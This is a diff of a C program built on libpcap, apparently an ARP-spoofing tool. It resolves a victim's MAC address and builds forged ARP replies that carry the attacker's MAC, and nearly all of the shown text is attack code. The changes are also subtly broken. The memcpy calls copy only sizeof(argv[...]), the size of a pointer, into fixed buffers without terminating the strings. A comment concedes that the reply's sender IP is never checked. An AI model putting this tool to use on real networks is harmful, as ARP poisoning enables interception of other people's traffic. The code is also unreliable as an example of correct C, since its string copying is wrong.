@@ -11,10 +11,9 @@ int main(int argc, char *argv[])
 {
     int i = 0;
     /* input values */
-    u_char *interface;      // eth 0
-    u_char *senderip;       // victim's ip
-    u_char *targetip;       // router's ip
-    u_char *targetmac;      // target's mac
+    u_char interface[20];      // eth 0
+    u_char senderip[20];       // victim's ip
+    u_char targetip[20];       // router's ip
     u_char gwip[20];        // gateway's ip
     u_char mymac[20];       // attacker's mac
     u_char myip[20];        // my mac
@@ -35,9 +34,9 @@ int main(int argc, char *argv[])
     }
 
     /* get values */
-    interface = argv[1];
-    senderip = argv[2];
-    targetip = argv[3];
+    memcpy(interface, argv[1], sizeof(argv[1]));
+    memcpy(senderip, argv[2], sizeof(argv[2]));
+    memcpy(targetip ,argv[3], sizeof(argv[3]));
 
     /* Get my mac */
     FILE *fp;
@@ -47,11 +46,7 @@ int main(int argc, char *argv[])
         exit (1);
     }
 
-    while(fgets(mymac, sizeof(mymac), fp) != NULL){
-        for(i = 0; i< sizeof(mymac)-1; i++){
-            mymac[i];
-        }
-    }
+    while(fgets(mymac, sizeof(mymac), fp) != NULL);
 
     /* Get Router ip */
     fp = popen("ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
@@ -60,11 +55,7 @@ int main(int argc, char *argv[])
         exit (1);
     }
 
-    while(fgets(gwip, sizeof(gwip), fp) != NULL){
-        for(i = 0; i< sizeof(gwip)-1; i++){
-            gwip[i];
-        }
-    }
+    while(fgets(gwip, sizeof(gwip), fp) != NULL);
 
     /* values setting */
     memset(ethHdr->ether_dhost, 0xFF, 6);               // Broadcasting
@@ -107,9 +98,8 @@ int main(int argc, char *argv[])
 
     if (handle == NULL) {   // handle error
         fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
-        return(1);
+        exit(1);
     }
-
     if (pcap_sendpacket(handle,(const u_char *)packet, sizeof(packet)) == -1){
         printf("ARP Request Error: %s\n", pcap_geterr(handle));
         exit(1);
@@ -124,28 +114,28 @@ int main(int argc, char *argv[])
 
     /* Take victim's MAC address */
     while(1) {
-
         int res = pcap_next_ex(handle, &pkHdr, &data);
         if (res == 0)
         {
             printf("Time out ... ...\n");
-            exit(1);
+            continue;
         } else if (res < 0) {
             printf("Can't get packet: %s\n", pcap_geterr(handle));
             exit(1);
         } else { // res == 1
             printf("Getting Packet... ");
-        }   
+        }
         ethHdr = (struct ether_header *)data;
 
         if(ntohs(ethHdr->ether_type) == ETHERTYPE_ARP) {
-            arpHdr = (struct ether_arp *)(data + 14);
+            arpHdr = (struct ether_arp *)(data + sizeof(struct ether_header));
         } else
             continue;
 
         if(ntohs(arpHdr->arp_op) != ARPOP_REPLY)
             continue;
 
+        // if( ??? == senderip) { How to check sender's ip??
         sprintf((u_char *) sendermac, "%02x:%02x:%02x:%02x:%02x:%02x",
                 arpHdr->arp_sha[0],
                 arpHdr->arp_sha[1],
@@ -154,6 +144,7 @@ int main(int argc, char *argv[])
                 arpHdr->arp_sha[4],
                 arpHdr->arp_sha[5]);
         break;
+        // }
     }
 
     printf("\n\"Successfully Got Victim's MAC!!\"\n\t--> %s\n", sendermac);
@@ -193,7 +184,7 @@ int main(int argc, char *argv[])
 
     memcpy(ethHdr->ether_dhost, arpHdr->arp_tha, sizeof(arpHdr->arp_tha));      // victim's mac
     memcpy(ethHdr->ether_shost, arpHdr->arp_sha, sizeof(arpHdr->arp_sha));      // Attacker's mac
-    ethHdr->ether_type = htons(ETHERTYPE_ARP);      
+    ethHdr->ether_type = htons(ETHERTYPE_ARP);
     arpHdr->arp_hrd = htons(ARPHRD_ETHER);
     arpHdr->arp_pro = htons(ETHERTYPE_IP);
     arpHdr->arp_hln = sizeof(arpHdr->arp_sha);
